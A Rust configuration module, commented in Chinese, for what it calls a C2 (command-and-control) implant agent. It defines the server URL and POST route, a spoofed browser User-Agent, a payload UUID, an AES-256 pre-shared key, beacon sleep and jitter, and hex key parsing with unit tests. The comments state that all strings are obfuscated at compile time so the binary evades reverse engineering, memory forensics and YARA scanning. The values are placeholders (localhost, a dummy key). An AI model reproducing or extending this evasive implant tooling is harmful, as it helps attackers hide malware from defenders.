//! # 全局通信规格与运营控制中枢 (Global Operational Config & Presets)
//!
//! ## 机制与策略分离设计哲学 (Separation of Mechanism and Policy)
//!
//! 1. **策略中枢收敛**：
//!    - 将 C2 目标地址、URI 路由、User-Agent、初始 Payload UUID、加密主密钥等战术参数统一收敛于本模块；
//!    - 底层传输与协议模块（`crypto.rs`, `protocol.rs`, `stream.rs`）不硬编码任何具体服务端业务参数。
//! 2. **编译期全量字符串混淆 (Zero Plaintext in `.rdata`)**：
//!    - 所有静态关键特征文本（如 URL、URI 路径、伪装 Header、初始 UUID）全量使用 [`obfstr::obfstr!`] 宏在调用者作用域就地解密；
//!    - 编译生成的 Release 二进制中绝不包含明文 C2 特征，有效免疫逆向分析、内存取证与静态 YARA 规则扫描。
//! 3. **零堆分配契约 (Zero-Heap OPSEC)**：
//!    - 通过宏展开或定长栈数组传递解密内容，不分配 `String`，用完即弃，杜绝在堆中驻留网络拓扑痕迹。

pub use obfstr::obfstr;

/// 默认基础心跳间隔 (秒)
pub const DEFAULT_SLEEP_INTERVAL: u64 = 10;

/// 默认心跳随机抖动率 (百分比: 0~100)
pub const DEFAULT_SLEEP_JITTER: u8 = 15;

/// 全局 C2 服务端 URL 宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_server_url {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "http://127.0.0.1:8080";);
    };
    () => {
        $crate::obfstr::obfstr!("http://127.0.0.1:8080")
    };
}

/// 全局 C2 POST 路由宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_post_uri {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "/api/v1/post";);
    };
    () => {
        $crate::obfstr::obfstr!("/api/v1/post")
    };
}

/// 全局 HTTP User-Agent 伪装头宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_user_agent {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36";);
    };
    () => {
        $crate::obfstr::obfstr!("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36")
    };
}

macro_rules! default_payload_uuid_literal {
    () => {
        "b50a5fe8-099d-4611-a2ac-96d93e6ec77b"
    };
}

macro_rules! default_master_key_hex_literal {
    () => {
        "3031323334353637383930313233343536373839303132333435363738393031"
    };
}

// =========================================================================
// 编译期静态健全性断言 (Compile-Time Sanity Assertions)
// =========================================================================
const _: () = {
    assert!(default_payload_uuid_literal!().len() == 36);
    assert!(default_master_key_hex_literal!().len() == 64);
};

/// 全局初始 Payload UUID 宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_payload_uuid {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "b50a5fe8-099d-4611-a2ac-96d93e6ec77b";);
    };
    () => {
        $crate::obfstr::obfstr!("b50a5fe8-099d-4611-a2ac-96d93e6ec77b")
    };
}

/// 全局 C2 服务器主机或 IP 宏展开 (支持直接作为参数调用或绑定到指定变量)
#[macro_export]
macro_rules! config_server_host {
    ($var:ident) => {
        $crate::obfstr::obfstr!(let $var = "127.0.0.1";);
    };
    () => {
        $crate::obfstr::obfstr!("127.0.0.1")
    };
}

/// 全局运营配置访问接口
pub struct AgentConfig;

impl AgentConfig {
    /// 获取 AES-256 初始预共享主密钥 (AESPSK: 32 字节栈数组)
    ///
    /// 采用 64 字符十六进制混淆编码，从根源上杜绝随机二进制密钥中
    /// 包含反斜杠 `\`、双引号 `"`、空字符 `\0` 或 UTF-8 多字节编码破坏 Rust 语法。
    #[inline(always)]
    pub fn master_key() -> [u8; 32] {
        obfstr::obfstr!(let hex_key = default_master_key_hex_literal!(););
        let mut key = [0u8; 32];
        let bytes = hex_key.as_bytes();
        let mut i = 0;
        while i < 32 {
            let h = match bytes[i * 2] {
                b'0'..=b'9' => bytes[i * 2] - b'0',
                b'a'..=b'f' => bytes[i * 2] - b'a' + 10,
                b'A'..=b'F' => bytes[i * 2] - b'A' + 10,
                _ => 0,
            };
            let l = match bytes[i * 2 + 1] {
                b'0'..=b'9' => bytes[i * 2 + 1] - b'0',
                b'a'..=b'f' => bytes[i * 2 + 1] - b'a' + 10,
                b'A'..=b'F' => bytes[i * 2 + 1] - b'A' + 10,
                _ => 0,
            };
            key[i] = (h << 4) | l;
            i += 1;
        }
        key
    }

    /// 获取初始 36 字节 Payload UUID 栈字节数组
    #[inline(always)]
    pub fn payload_uuid_bytes() -> [u8; 36] {
        config_payload_uuid!(uuid_str);
        let mut uuid = [0u8; 36];
        uuid.copy_from_slice(uuid_str.as_bytes());
        uuid
    }

    /// 获取 C2 服务端端口
    #[inline(always)]
    pub const fn server_port() -> u16 {
        8080
    }

    /// 获取是否使用 HTTPS
    #[inline(always)]
    pub const fn is_https() -> bool {
        false
    }

    /// 获取默认心跳休眠间隔 (秒)
    #[inline(always)]
    pub const fn default_sleep_interval() -> u64 {
        DEFAULT_SLEEP_INTERVAL
    }

    /// 获取默认心跳休眠抖动率 (百分比: 0~100)
    #[inline(always)]
    pub const fn default_sleep_jitter() -> u8 {
        DEFAULT_SLEEP_JITTER
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_config_obfuscated_values() {
        assert_eq!(config_server_url!(), "http://127.0.0.1:8080");
        assert_eq!(config_post_uri!(), "/api/v1/post");
        assert!(config_user_agent!().contains("Mozilla/5.0"));
        assert_eq!(config_payload_uuid!().len(), 36);

        config_server_url!(url_var);
        assert_eq!(url_var, "http://127.0.0.1:8080");

        assert_eq!(AgentConfig::master_key().len(), 32);
        assert_eq!(AgentConfig::master_key(), *b"01234567890123456789012345678901");
        assert_eq!(AgentConfig::payload_uuid_bytes().len(), 36);
    }

    #[test]
    fn test_arbitrary_binary_key_roundtrip() {
        let raw_binary_key: [u8; 32] = [
            0x00, 0x22, 0x5c, 0xff, 0x0a, 0x0d, 0x7f, 0x80,
            0xaa, 0x55, 0x12, 0x34, 0x56, 0x78, 0x9a, 0xbc,
            0xde, 0xf0, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66,
            0x77, 0x88, 0x99, 0xaa, 0xbb, 0xcc, 0xdd, 0xee,
        ];
        let hex_key = "00225cff0a0d7f80aa55123456789abcdef0112233445566778899aabbccddee";
        let mut key = [0u8; 32];
        let bytes = hex_key.as_bytes();
        let mut i = 0;
        while i < 32 {
            let h = match bytes[i * 2] {
                b'0'..=b'9' => bytes[i * 2] - b'0',
                b'a'..=b'f' => bytes[i * 2] - b'a' + 10,
                b'A'..=b'F' => bytes[i * 2] - b'A' + 10,
                _ => 0,
            };
            let l = match bytes[i * 2 + 1] {
                b'0'..=b'9' => bytes[i * 2 + 1] - b'0',
                b'a'..=b'f' => bytes[i * 2 + 1] - b'a' + 10,
                b'A'..=b'F' => bytes[i * 2 + 1] - b'A' + 10,
                _ => 0,
            };
            key[i] = (h << 4) | l;
            i += 1;
        }
        assert_eq!(key, raw_binary_key);
    }
}
